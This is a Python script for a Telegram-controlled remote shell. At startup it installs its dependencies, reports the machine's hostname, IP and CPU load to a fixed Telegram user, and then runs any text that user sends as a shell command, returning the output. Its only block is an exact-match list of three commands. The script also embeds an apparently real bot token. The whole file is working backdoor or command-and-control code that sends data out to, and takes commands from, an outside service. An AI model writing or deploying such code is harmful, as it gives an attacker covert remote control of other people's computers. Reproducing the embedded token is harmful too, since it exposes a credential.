import subprocess
import sys
import socket

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages
install_package('pyTelegramBotAPI')
install_package('psutil')  # Optional but recommended

# Now import the modules
import telebot
import psutil  # Optional

TOKEN = '8381810374:AAE9DCSYOs2FEZ5pwscTAu-9Zfmcn6DKBcA'  # Your bot token
ALLOWED_USER_ID = 8028882192  # Your Telegram user ID

bot = telebot.TeleBot(TOKEN)

def send_startup_message():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    cpu_usage = psutil.cpu_percent()  # Using psutil for better system info
    bot.send_message(ALLOWED_USER_ID, f"💻 PC Connected\nHost: {hostname}\nIP: {ip_address}\nCPU: {cpu_usage}%")

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    if message.from_user.id != ALLOWED_USER_ID:
        bot.reply_to(message, "⚠️ Unauthorized access!")
        return

    try:
        # Basic command validation
        if message.text.strip().lower() in ('rm -rf', 'format', 'shutdown'):
            bot.reply_to(message, "❌ Dangerous command blocked!")
            return
            
        result = subprocess.check_output(
            message.text, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            timeout=15,
            universal_newlines=True
        )
        response = f'```\n{result}\n```' if result else 'Command executed'
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f'Error:\n```\n{e.output}\n```', parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f'Exception: {str(e)}')

if __name__ == "__main__":
    try:
        send_startup_message()
        bot.polling(none_stop=True)
    except Exception as e:
        bot.send_message(ALLOWED_USER_ID, f"❌ Bot crashed: {str(e)}")
